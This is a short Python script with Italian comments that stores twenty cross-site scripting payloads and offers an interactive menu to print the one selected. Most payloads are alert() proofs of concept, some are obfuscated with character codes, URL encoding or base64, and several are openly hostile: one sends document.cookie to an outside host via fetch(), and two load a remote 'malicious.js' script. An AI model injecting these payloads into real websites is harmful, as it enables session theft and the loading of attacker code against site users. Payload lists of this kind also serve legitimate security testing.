# xss_payloads.py

# Lista di payload XSS (comuni e non comuni)
xss_payloads = [
    # Payload comuni
    ("1", "<script>alert('XSS')</script>"),
    ("2", "<img src='x' onerror='alert(1)' />"),
    ("3", "<svg/onload=alert(1)>"),
    ("4", "<body onload=alert(1)>"),
    ("5", "<a href='javascript:alert(1)'>Click me</a>"),
    ("6", "<button onclick='alert(1)'>Click me</button>"),
    ("7", "<input type='text' value='x' onfocus='alert(1)'>"),

    # Varianti avanzate
    ("8", "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116)) />"),
    ("9", "<iframe src='javascript:alert(1)'></iframe>"),
    ("10", "<script src='http://example.com/malicious.js'></script>"),
    
    # Varianti di encoding
    ("11", "<script>%65%76%61%6C%28%61%6C%65%72%74%28%27XSS%27%29%29</script>"),
    ("12", "<script>eval(atob('YWxlcnQoIkhpdGhpYXMgc3VjY2VzcyIgKSk=')); </script>"),

    # Payload XSS non comuni
    ("13", "<iframe srcdoc='<script>alert(1)</script>'></iframe>"),
    ("14", "<script>fetch('http://malicious.com?cookie=' + document.cookie)</script>"),
    ("15", "<script>window.location='javascript:alert(1)'</script>"),
    ("16", "<script>document.write('<img src=1 onerror=alert(1)>')</script>"),
    ("17", "<div onmouseover='alert(1)'>Hover me</div>"),
    ("18", "<script>document.createElement('img').src='x' + (function(){alert(1)})() </script>"),
    ("19", "<script>var x = document.createElement('script'); x.src = 'http://example.com/malicious.js'; document.body.appendChild(x);</script>"),
    ("20", "<object data='data:text/html,<script>alert(1)</script>'></object>")
]

# Funzione per stampare il menu e selezionare un payload
def menu():
    print("Seleziona un payload XSS:")
    for option, _ in xss_payloads:
        print(f"{option}. Payload XSS")

    choice = input("Inserisci il numero del payload da scegliere (1-20): ")

    try:
        payload = next(p[1] for p in xss_payloads if p[0] == choice)
        print(f"Hai selezionato il payload: {payload}")
    except StopIteration:
        print("Scelta non valida, prova di nuovo.")

# Funzione principale
def main():
    while True:
        menu()
        again = input("Vuoi selezionare un altro payload? (s/n): ").lower()
        if again != 's':
            print("Uscita...")
            break

# Esegui il programma
if __name__ == "__main__":
    main()
